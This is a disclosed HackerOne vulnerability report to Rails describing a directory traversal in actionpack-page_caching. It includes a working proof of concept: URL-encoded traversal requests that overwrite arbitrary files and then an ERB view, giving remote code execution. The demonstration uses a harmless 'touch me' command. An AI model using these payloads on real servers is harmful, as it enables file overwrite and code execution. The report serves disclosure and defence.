# File writing by Directory traversal at actionpack-page_caching and RCE by it

## Report Details
- **Report ID**: 519220
- **URL**: https://hackerone.com/reports/519220
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-03-31T07:25:13.608Z
- **Disclosed**: 2020-07-13T02:45:21.644Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
I found a directory traversal in `actionpack-page_caching`.
Some code may lead to RCE.


https://github.com/rails/actionpack-page_caching/blob/master/lib/action_controller/caching/pages.rb#L143

```ruby
  def cache_file(path, extension)
    if path.empty? || path =~ %r{\A/+\z}
      name = "/index"
    else
      name = URI.parser.unescape(path.chomp("/"))
    end

    if File.extname(name).empty?
      name + (extension || default_extension)
    else
      name
    end
  end

  def cache_path(path, extension = nil)
    File.join(cache_directory, cache_file(path, extension))
  end
```

The problem is that traversal is not considered in cache_path or cache_file.
Since the URL can use `.` or` / `encoded values, the cache will be written in an unexpected place.

### PoC

#### step 1. Prepare server

```log
ruby -v

rails -v

rails new caching_traversal

cd caching_traversal

# add `gem "actionpack-page_caching"` in Gemfile

bundle install

rails generate scaffold book name:string
rails db:migrate
```

#### step 2. Setting cache

Enable caching.

```log
rails dev:cache
```

Add `caches_page`.

```ruby
# app/controllers/books_contorller.rb
class BooksController < ApplicationController
  before_action :set_book, only: [:show, :edit, :update, :destroy]

  caches_page :show
```

#### step 3. Start server

Start the server with "rails s".

Prepare a book with the following name.

```
<% `toouch me` %>
```


Check cache behavior.

```log
❯ curl "http://localhost:3000/books/1"
<!DOCTYPE html>
...
<p>
  <strong>Name:</strong>
  &lt;% `touch me` %&gt;
</p>
...

❯ ls public
404.html  500.html                          apple-touch-icon.png  favicon.ico
422.html  apple-touch-icon-precomposed.png  books                 robots.txt

❯ cat public/books/1.html
<!DOCTYPE html>
...
<p>
  <strong>Name:</strong>
  &lt;% `touch me` %&gt;
</p>
...

```


#### step 4. Attack 

Add an attack code to the pass and check the result.

```log
❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftest"

# test file is generated
❯ ls
app  config     db       Gemfile.lock  log           public    README.md  test       tmp
bin  config.ru  Gemfile  lib           package.json  Rakefile  storage    test.html  vendor


❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fREADME%2emd"

# If the file exists it will be overwritten
❯ cat README.md
...
<p>
  <strong>Name:</strong>
  &lt;% `touch me` %&gt;
</p>
...
```

#### step 5. RCE

RCE is possible if it is possible to create a cache where the value of `<%` is not escaped, like render for text.

Generate the file `app/views/books/show.text.erb` as follows:


```
name: <%= @ book.name %>
```

Overwriting erb files enables RCE.

```log
# overwrite erb
❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2fviews%2fbooks%2fshow%2etext%2eerb?format=text"
name: <% `touch me` %>

❯ cat app/views/books/show.text.erb
name: <% `touch me` %>


# executed `touch me`
❯ curl "http://localhost:3000/books/1.txt"
name:

# me file is generated
❯ ls
app  config     db       Gemfile.lock  log  package.json  Rakefile   storage  test.html  vendor
bin  config.ru  Gemfile  lib           me   public        README.md  test     tmp
```

## Impact

The cache is generated on an unintended path. Also, RCE may be possible.

## Attachments
No attachments
